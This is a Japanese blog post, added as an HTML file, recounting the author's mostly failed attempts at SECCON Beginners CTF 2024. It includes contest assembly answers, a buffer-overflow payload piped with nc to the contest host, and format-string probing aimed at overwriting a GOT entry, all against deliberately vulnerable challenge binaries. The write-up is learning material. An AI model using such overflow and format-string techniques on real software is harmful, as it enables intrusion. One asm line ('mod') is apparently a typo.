@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>Figaro&#x27;s Blog</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+    <meta name="robots" content="noodp"/>
+
+    <link rel="stylesheet" href="https://figaro-san.github.io/style.css">
+    <link rel="stylesheet" href="https://figaro-san.github.io/color/green.css">
+
+        <link rel="stylesheet" href="https://figaro-san.github.io/color/background_dark.css">
+    
+    <link rel="stylesheet" href="https://figaro-san.github.io/font-hack-subset.css">
+
+    <meta name="description" content="">
+
+    <meta property="og:description" content="">
+    <meta property="og:title" content="Figaro's Blog">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://figaro-san.github.io/seccon-beginners-ctf-2024/">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:description" content="">
+    <meta name="twitter:title" content="Figaro's Blog">
+    <meta property="twitter:domain" content="figaro-san.github.io">
+    <meta property="twitter:url" content="https://figaro-san.github.io/seccon-beginners-ctf-2024/">
+
+        <link rel="shortcut icon" type="image&#x2F;x-icon" href="/butterfly.jpg">
+    
+    </head>
+
+<body class="">
+<div class="container">
+    
+    <header class="header">
+        <div class="header__inner">
+            <div class="header__logo">
+                    
+                <a href="https://figaro-san.github.io" style="text-decoration: none;">
+                    <div class="logo">
+                      
+                            Figaro&#x27;s Blog
+                        
+                    </div>
+                </a>
+            </div>
+        </div>
+
+        
+        
+                <nav class="menu">
+            <ul class="menu__inner">
+                <li class="active"><a href="https://figaro-san.github.io">blog</a></li>
+            
+                <li><a href="https://figaro-san.github.io/tags">tags</a></li>
+            
+                <li><a href="https://figaro-san.github.io/whoami">whoami</a></li>
+            
+                <li><a href="https://figaro-san.github.io/about">about</a></li>
+            </ul>
+        </nav>
+    
+    
+        
+    </header>
+    
+
+    <div class="content">
+        
+    <div class="post">
+        
+    <h1 class="post-title"><a href="https://figaro-san.github.io/seccon-beginners-ctf-2024/"> > SECCON Beginners CTF 敗戦記</a></h1>
+    <div class="post-meta-inline">
+        
+    <span class="post-date">
+            2024-06-17
+        </span>
+
+    </div>
+
+    
+        <span class="post-tags-inline">
+                :: tags:&nbsp;
+                <a class="post-tag" href="https://figaro-san.github.io/tags/asm/">#Asm</a>&nbsp;
+                <a class="post-tag" href="https://figaro-san.github.io/tags/c/">#C</a>&nbsp;
+                <a class="post-tag" href="https://figaro-san.github.io/tags/ctf/">#CTF</a>&nbsp;
+                <a class="post-tag" href="https://figaro-san.github.io/tags/pwn/">#Pwn</a>&nbsp;
+                <a class="post-tag" href="https://figaro-san.github.io/tags/tech/">#Tech</a></span>
+    
+
+        <div class="post-content">
+            <h1 id="konoji-shi-nituite">この記事について</h1>
+<p>この記事はWriteupというより敗戦記です。
+Writeupを期待した方には申し訳ありません。
+どっちかって言うと自分を戒めるための記事として書きました。</p>
+<hr />
+<h1 id="jie-guo">結果</h1>
+<p>惨敗しました。チーム人数が少ないというのもあるかもしれませんが、それ以上に私がreversingに関して1問も解けなかったことが最も悔しい部分です。
+去年のhalf、three、pokerぐらいなら解けたので、慢心して高を括っていたのですが、今年のassembleとcha-ll-engeに惨敗しました。(というかassembleに関しては知識が足りませんでした。)
+またpwnに関しても、simpleoverflowやsimpleroverwriteは解けましたが、pure-and-easyが解けずに負けました。
+ROPに関しては今回も全く分からなかったのでこれは今後の課題なのですが、それにしてもpure-and-easyぐらいは解きたかったですね。</p>
+<p>とりあえずここから下はwriteupというか、解こうとして解けた問題と解けなかった問題について書いていきます。</p>
+<hr />
+<h1 id="reversing-assemble-tu-zhong-madejie-keta">reversing / assemble (途中まで解けた)</h1>
+<p>challenge 1, 2, 3までは解けました。</p>
+<p>challenge 1</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>mod rax, 0x123
+</span></code></pre>
+<p>challenge 2</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>mov rax, 0x123
+</span><span>push rax
+</span></code></pre>
+<p>challenge 3</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>mov rax, 0x1
+</span><span>mov rdi, 0x1
+</span><span>mov rdx, 0x1
+</span><span>
+</span><span>push 0x48
+</span><span>mov rsi, rsp
+</span><span>syscall
+</span><span>
+</span><span>push 0x65
+</span><span>mov rsi, rsp
+</span><span>syscall
+</span><span>
+</span><span>push 0x6c
+</span><span>mov rsi, rsp
+</span><span>syscall
+</span><span>
+</span><span>push 0x6c
+</span><span>mov rsi, rsp
+</span><span>syscall
+</span><span>
+</span><span>push 0x6f
+</span><span>mov rsi, rsp
+</span><span>syscall
+</span></code></pre>
+<p>多分challenge 3に関しては文字列をまとめて<code>push</code>してから、<code>write</code>システムコールかければ一回で文字列を出力できたと思います。つまり無駄に長い回答ってこと。</p>
+<p>challenge 4が無理でした。</p>
+<hr />
+<h1 id="reversing-cha-ll-enge-jie-ketenai">reversing / cha-ll-enge (解けてない)</h1>
+<p>配られたファイル<code>cha.ll.enge</code>がllvmにおけるIRであることまでは理解したのですが、初めてllvm関連に遭遇したので全く分かりませんでした。</p>
+<hr />
+<h1 id="reversing-construct-jie-ketenai">reversing / construct (解けてない)</h1>
+<p>mainが他の関数などを制御してないプログラムを初めて見たので全く歯が立ちませんでした。</p>
+<hr />
+<h1 id="pwn-simpleoverflow">pwn / simpleoverflow</h1>
+<pre data-lang="c" style="background-color:#151515;color:#e8e8d3;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#8fbfdc;">#include </span><span style="color:#556633;">&lt;</span><span style="color:#99ad6a;">stdio.h</span><span style="color:#556633;">&gt;
+</span><span style="color:#8fbfdc;">#include </span><span style="color:#556633;">&lt;</span><span style="color:#99ad6a;">stdlib.h</span><span style="color:#556633;">&gt;
+</span><span style="color:#8fbfdc;">#include </span><span style="color:#556633;">&lt;</span><span style="color:#99ad6a;">unistd.h</span><span style="color:#556633;">&gt;
+</span><span>
+</span><span style="color:#8fbfdc;">int </span><span style="color:#fad07a;">main</span><span>() {
+</span><span>  </span><span style="color:#8fbfdc;">char</span><span> buf[</span><span style="color:#cf6a4c;">10</span><span>] = {</span><span style="color:#cf6a4c;">0</span><span>};
+</span><span>  </span><span style="color:#8fbfdc;">int</span><span> is_admin = </span><span style="color:#cf6a4c;">0</span><span>;
+</span><span>  printf(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">name:</span><span style="color:#556633;">&quot;</span><span>);
+</span><span>  </span><span style="color:#ffb964;">read</span><span>(</span><span style="color:#cf6a4c;">0</span><span>, buf, </span><span style="color:#cf6a4c;">0x10</span><span>);
+</span><span>  printf(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">Hello, </span><span style="color:#7697d6;">%s</span><span style="color:#99ad6a;">\n</span><span style="color:#556633;">&quot;</span><span>, buf);
+</span><span>  </span><span style="color:#8fbfdc;">if </span><span>(!is_admin) {
+</span><span>    puts(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">You are not admin. bye</span><span style="color:#556633;">&quot;</span><span>);
+</span><span>  } </span><span style="color:#8fbfdc;">else </span><span>{
+</span><span>    system(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">/bin/cat ./flag.txt</span><span style="color:#556633;">&quot;</span><span>);
+</span><span>  }
+</span><span>  </span><span style="color:#8fbfdc;">return </span><span style="color:#cf6a4c;">0</span><span>;
+</span><span>}
+</span><span>
+</span><span style="color:#8fbfdc;">__attribute__</span><span>((constructor)) </span><span style="color:#8fbfdc;">void </span><span style="color:#fad07a;">init</span><span>() {
+</span><span>  setvbuf(stdin, NULL, _IONBF, </span><span style="color:#cf6a4c;">0</span><span>);
+</span><span>  setvbuf(stdout, NULL, _IONBF, </span><span style="color:#cf6a4c;">0</span><span>);
+</span><span>  </span><span style="color:#ffb964;">alarm</span><span>(</span><span style="color:#cf6a4c;">120</span><span>);
+</span><span>}
+</span><span>
+</span></code></pre>
+<p>ソースコードを見ると、<code>buf[10]</code>に対して、<code>read(0, buf, 0x10)</code>としており、<code>0x10</code>は10進数に直すと16なので、bufの領域を超えて値を書き込めることが分かりました。
+さらには<code>is_admin</code>が<code>buf</code>より上位のアドレスにあるため、バッファオーバーフローで値が上書きできそうだと分かります。
+C言語は0でなければtrueなので、<code>if(!is_admin)</code>において<code>else</code>が実行されてフラグが獲得できます。</p>
+<hr />
+<h1 id="pwn-simpleoverwrite">pwn / simpleoverwrite</h1>
+<pre data-lang="c" style="background-color:#151515;color:#e8e8d3;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#8fbfdc;">#include </span><span style="color:#556633;">&lt;</span><span style="color:#99ad6a;">stdint.h</span><span style="color:#556633;">&gt;
+</span><span style="color:#8fbfdc;">#include </span><span style="color:#556633;">&lt;</span><span style="color:#99ad6a;">stdio.h</span><span style="color:#556633;">&gt;
+</span><span style="color:#8fbfdc;">#include </span><span style="color:#556633;">&lt;</span><span style="color:#99ad6a;">stdlib.h</span><span style="color:#556633;">&gt;
+</span><span style="color:#8fbfdc;">#include </span><span style="color:#556633;">&lt;</span><span style="color:#99ad6a;">unistd.h</span><span style="color:#556633;">&gt;
+</span><span>
+</span><span style="color:#8fbfdc;">void </span><span style="color:#fad07a;">win</span><span>() {
+</span><span>  </span><span style="color:#8fbfdc;">char</span><span> buf[</span><span style="color:#cf6a4c;">100</span><span>];
+</span><span>  FILE *f = fopen(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">./flag.txt</span><span style="color:#556633;">&quot;</span><span>, </span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">r</span><span style="color:#556633;">&quot;</span><span>);
+</span><span>  fgets(buf, </span><span style="color:#cf6a4c;">100</span><span>, f);
+</span><span>  puts(buf);
+</span><span>}
+</span><span>
+</span><span style="color:#8fbfdc;">int </span><span style="color:#fad07a;">main</span><span>() {
+</span><span>  </span><span style="color:#8fbfdc;">char</span><span> buf[</span><span style="color:#cf6a4c;">10</span><span>] = {</span><span style="color:#cf6a4c;">0</span><span>};
+</span><span>  printf(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">input:</span><span style="color:#556633;">&quot;</span><span>);
+</span><span>  </span><span style="color:#ffb964;">read</span><span>(</span><span style="color:#cf6a4c;">0</span><span>, buf, </span><span style="color:#cf6a4c;">0x20</span><span>);
+</span><span>  printf(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">Hello, </span><span style="color:#7697d6;">%s</span><span style="color:#99ad6a;">\n</span><span style="color:#556633;">&quot;</span><span>, buf);
+</span><span>  printf(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">return to: 0x</span><span style="color:#7697d6;">%lx</span><span style="color:#99ad6a;">\n</span><span style="color:#556633;">&quot;</span><span>, *(uint64_t *)(((</span><span style="color:#8fbfdc;">void </span><span>*)buf) + </span><span style="color:#cf6a4c;">18</span><span>));
+</span><span>  </span><span style="color:#8fbfdc;">return </span><span style="color:#cf6a4c;">0</span><span>;
+</span><span>}
+</span><span>
+</span><span style="color:#8fbfdc;">__attribute__</span><span>((constructor)) </span><span style="color:#8fbfdc;">void </span><span style="color:#fad07a;">init</span><span>() {
+</span><span>  setvbuf(stdin, NULL, _IONBF, </span><span style="color:#cf6a4c;">0</span><span>);
+</span><span>  setvbuf(stdout, NULL, _IONBF, </span><span style="color:#cf6a4c;">0</span><span>);
+</span><span>  </span><span style="color:#ffb964;">alarm</span><span>(</span><span style="color:#cf6a4c;">120</span><span>);
+</span><span>}
+</span></code></pre>
+<p>Overflowとあるのでとりあえず大量に<code>A</code>を送ってみました。</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>AAAAAAAAAAAAAAAAAAA
+</span></code></pre>
+<p>ぐらいでリターンアドレスを1バイト侵食していたので、18バイトがリターンアドレスへのオフセットだと分かります。
+また<code>win()</code>関数が<code>0x401186</code>にあったため、</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>perl -e &#39;print &quot;A&quot;x18 . &quot;\x86\x11\x40\x00&quot; | nc simpleoverwrite.beginners.seccon.games 9001
+</span></code></pre>
+<p>とすることでフラグがゲットできます。</p>
+<hr />
+<h1 id="pwn-pure-and-easy-jie-ketenai">pwn / pure-and-easy (解けてない)</h1>
+<p>解けていませんが、その時考えていた全てのアイデアを書いておきます。
+(後に他のwriteupとも比較するため)</p>
+<pre data-lang="c" style="background-color:#151515;color:#e8e8d3;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#8fbfdc;">#include </span><span style="color:#556633;">&lt;</span><span style="color:#99ad6a;">stdio.h</span><span style="color:#556633;">&gt;
+</span><span style="color:#8fbfdc;">#include </span><span style="color:#556633;">&lt;</span><span style="color:#99ad6a;">stdlib.h</span><span style="color:#556633;">&gt;
+</span><span style="color:#8fbfdc;">#include </span><span style="color:#556633;">&lt;</span><span style="color:#99ad6a;">unistd.h</span><span style="color:#556633;">&gt;
+</span><span>
+</span><span style="color:#8fbfdc;">int </span><span style="color:#fad07a;">main</span><span>() {
+</span><span>  </span><span style="color:#8fbfdc;">char</span><span> buf[</span><span style="color:#cf6a4c;">0x100</span><span>] = {</span><span style="color:#cf6a4c;">0</span><span>};
+</span><span>  printf(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">&gt; </span><span style="color:#556633;">&quot;</span><span>);
+</span><span>  </span><span style="color:#ffb964;">read</span><span>(</span><span style="color:#cf6a4c;">0</span><span>, buf, </span><span style="color:#cf6a4c;">0xff</span><span>);
+</span><span>  printf(buf);
+</span><span>  exit(</span><span style="color:#cf6a4c;">0</span><span>);
+</span><span>}
+</span><span>
+</span><span style="color:#8fbfdc;">void </span><span style="color:#fad07a;">win</span><span>() {
+</span><span>  </span><span style="color:#8fbfdc;">char</span><span> buf[</span><span style="color:#cf6a4c;">0x50</span><span>];
+</span><span>  FILE *fp = fopen(</span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">./flag.txt</span><span style="color:#556633;">&quot;</span><span>, </span><span style="color:#556633;">&quot;</span><span style="color:#99ad6a;">r</span><span style="color:#556633;">&quot;</span><span>);
+</span><span>  fgets(buf, </span><span style="color:#cf6a4c;">0x50</span><span>, fp);
+</span><span>  puts(buf);
+</span><span>}
+</span><span>
+</span><span style="color:#8fbfdc;">__attribute__</span><span>((constructor)) </span><span style="color:#8fbfdc;">void </span><span style="color:#fad07a;">init</span><span>() {
+</span><span>  setvbuf(stdin, NULL, _IONBF, </span><span style="color:#cf6a4c;">0</span><span>);
+</span><span>  setvbuf(stdout, NULL, _IONBF, </span><span style="color:#cf6a4c;">0</span><span>);
+</span><span>  </span><span style="color:#ffb964;">alarm</span><span>(</span><span style="color:#cf6a4c;">120</span><span>);
+</span><span>}
+</span></code></pre>
+<p>はじめに、ソースコードより<code>printf(buf)</code>とその下にある<code>exit(0)</code>が見え、おそらく書式文字列攻撃で<code>exit(0)</code>のgotを書き換える問題だと考えました。</p>
+<p>実際に、</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>checksec --file=chall
+</span></code></pre>
+<p>してみると、<code>Partial RELRO</code>で<code>No PIE</code>でもあったため、gotの書き換えは成功しそうです。</p>
+<p>次に、</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>readelf -r chall
+</span></code></pre>
+<p>してみると、</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>000000404000  000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
+</span><span>000000404008  000300000007 R_X86_64_JUMP_SLO 0000000000000000 __stack_chk_fail@GLIBC_2.4 + 0
+</span><span>000000404010  000400000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5 + 0
+</span><span>000000404018  000500000007 R_X86_64_JUMP_SLO 0000000000000000 alarm@GLIBC_2.2.5 + 0
+</span><span>000000404020  000600000007 R_X86_64_JUMP_SLO 0000000000000000 read@GLIBC_2.2.5 + 0
+</span><span>000000404028  000700000007 R_X86_64_JUMP_SLO 0000000000000000 fgets@GLIBC_2.2.5 + 0
+</span><span>000000404030  000900000007 R_X86_64_JUMP_SLO 0000000000000000 setvbuf@GLIBC_2.2.5 + 0
+</span><span>000000404038  000a00000007 R_X86_64_JUMP_SLO 0000000000000000 fopen@GLIBC_2.2.5 + 0
+</span><span>000000404040  000b00000007 R_X86_64_JUMP_SLO 0000000000000000 exit@GLIBC_2.2.5 + 0
+</span></code></pre>
+<p>これより<code>exit()</code>の関数アドレスは<code>0x404040</code>にあることが分かります。</p>
+<p>さらに、</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>objdump -M intel -D chall
+</span></code></pre>
+<p>でバイナリを覗き見ると、<code>win()</code>関数が</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>0000000000401341 &lt;win&gt;:
+</span><span>  401341:       55                      push   rbp
+</span><span>  401342:       48 89 e5                mov    rbp,rsp
+</span><span>  401345:       48 83 ec 70             sub    rsp,0x70
+</span><span>  401349:       64 48 8b 04 25 28 00    mov    rax,QWORD PTR fs:0x28
+</span><span>  401350:       00 00 
+</span><span>    .
+</span><span>    .
+</span><span>    .
+</span></code></pre>
+<p><code>0x401341</code>にあることが分かりました。
+以上のことから、アドレス<code>0x404040</code>に<code>0x401341</code>を書き込むことができれば、<code>exit()</code>関数実行時に、<code>win()</code>関数へと遷移することができるはずだと考えました。</p>
+<p>ここで、一度書式文字列攻撃を行って、入力文字がスタックの何番目に出現するかを確認してみました。</p>
+<pre style="background-color:#151515;color:#e8e8d3;"><code><span>$ perl -e &#39;print &quot;AAAA&quot; . &quot;%p &quot;x8&#39; | nc pure-and-easy.beginners.seccon.games 9000
+</span><span> 
+</span><span>&gt; AAAA0x7fffaf8caa90 0xff 0x7f275b9fea61 0x2 0x7f275bafe380 0x2520702541414141 0x2070252070252
+</span><span>070 0x7025207025207025 
+</span></code></pre>
+<p>このことより、6番目に入力した値が出現すると分かります。
+であれば、6番目にアドレス<code>0x404040</code>を出現させ、ダイレクトパラメータアクセス('%Nx%6$n', Nはwin関数のアドレスに相当するバイト数のための空白の数)で<code>0x404040</code>に<code>0x401341</code>を書き込めば良いと変わります。</p>
+<p>このとき、私は<code>0x401341</code>は10進数で<code>4199233</code>であり、入力するアドレス4バイト分を考慮した<code>4199229</code>をNとすれば良いと考えていました。ですが、一つの書式指定子はスタック上のデータ8バイトと紐付いているように見え、アドレスも4バイトではなく8バイトで指定するのかどうかが分かりませんでした。さらに8バイトで指定するなら、上位5バイトは全てナルバイトですからこれを一体どうやって挿入するべきかも分かりませんでした。</p>
+<p>ここまでが考えられた全てで、fsbに関する知識不足を痛感しました。</p>
+<hr />
+<h1 id="zui-hou-ni">最後に</h1>
+<p>自分へのメモ用途でもあるので、この記事を作成することで自分に足りない知識を自覚しつつ、次に繋げられるようにしたいと思います。具体的にはアセンブリによるシステムコールの詳細やllvm周辺の知識、fsbやROPの実践的な経験が足りないと今回のコンテストで痛感しました。</p>
+<p>それとDockerが必要なことに今回始めて気づいて焦りました。急いで環境整えて必要なコマンドだけ覚えましたが、これも準備不足でした。
+あと他の方のwriteupを見るとpwnに関してはpwntoolsも標準装備っぽいので、慣れていく必要がありそうです。</p>
+
+        </div>
+
+        
+            <div class="pagination">
+                <div class="pagination__title">
+                    <span class="pagination__title-h">Thanks for reading! Read other posts?</span>
+                    <hr />
+                </div>
+                <div class="pagination__buttons">
+                        <span class="button previous">
+                            <a href="https://figaro-san.github.io/diver-osint-ctf/">
+                                <span class="button__icon">←</span>&nbsp;
+                                <span class="button__text">DIVER OSINT CTF writeup</span>
+                            </a>
+                        </span>
+                    
+                    
+                        <span class="button next">
+                            <a href="https://figaro-san.github.io/why-dont-you-write-shellcode/">
+                                <span class="button__text">貴方は何故シェルコードを作成しないのか</span>&nbsp;
+                                <span class="button__icon">→</span>
+                            </a>
+                        </span>
+                    </div>
+            </div>
+        
+    </div>
+
+    </div>
+
+    
+    <footer class="footer">
+        <div class="footer__inner">
+                <div class="copyright">
+                        <span>© 
+    2025
+ Powered by <a href="https://www.getzola.org/">Zola</a></span>
+                    <span class="copyright-theme">
+                        <span class="copyright-theme-sep">:: </span>
+                        Theme: <a href="https://github.com/pawroman/zola-theme-terminimal/">Terminimal</a> by pawroman
+                    </span>
+                </div>
+            </div>
+    </footer>
+    
+
+</div>
+</body>
+
+</html>
